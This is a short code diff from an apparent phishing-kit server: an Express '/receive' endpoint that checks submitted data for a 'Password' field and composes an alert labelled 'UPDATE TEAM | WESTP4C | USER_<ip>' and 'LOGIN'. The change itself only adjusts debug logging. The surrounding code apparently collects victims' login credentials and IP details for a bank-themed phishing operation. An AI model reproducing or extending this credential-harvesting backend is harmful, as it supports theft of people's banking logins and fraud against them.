@@ -200,8 +200,9 @@ app.post('/receive', async (req, res) => {
   const systemLang = req.headers["accept-language"];
 
   const myObjects = Object.keys(myObject);
-  console.log(myObjects);
-
+  //console.log(myObjects);
+	console.log(ipAddressInformation);
+  
   if (myObjects.includes('Password')) {
     message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
                `👤 LOGIN \n\n`;
